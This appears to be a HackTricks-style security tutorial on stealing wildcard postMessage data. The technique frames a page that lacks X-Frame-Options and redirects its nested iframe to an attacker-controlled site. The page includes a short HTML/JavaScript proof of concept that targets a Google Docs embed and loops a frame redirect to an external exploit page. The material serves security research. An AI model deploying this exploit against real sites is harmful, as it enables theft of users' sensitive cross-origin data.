# Steal postmessage modifying iframe location

{{#include ../../banners/hacktricks-training.md}}

## Changing child iframes locations

According to [**this writeup**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), if you can iframe a webpage without X-Frame-Header that contains another iframe, you can **change the location of that child iframe**.

For example, if abc.com have efg.com as iframe and abc.com didn't have X-Frame header, I could change the efg.com to evil.com cross origin using, **`frames.location`**.

This is specially useful in **postMessages** because if a page is sending sensitive data using a **wildcard** like `windowRef.postmessage("","*")` it's possible to **change the location of the related iframe (child or parent) to an attackers controlled location** and steal that data.

```html
<html>
  <iframe src="https://docs.google.com/document/ID" />
  <script>
    //pseudo code
    setTimeout(function () {
      exp()
    }, 6000)

    function exp() {
      //needs to modify this every 0.1s as it's not clear when the iframe of the iframe affected is created
      setInterval(function () {
        window.frames[0].frame[0][2].location =
          "https://geekycat.in/exploit.html"
      }, 100)
    }
  </script>
</html>
```

{{#include ../../banners/hacktricks-training.md}}



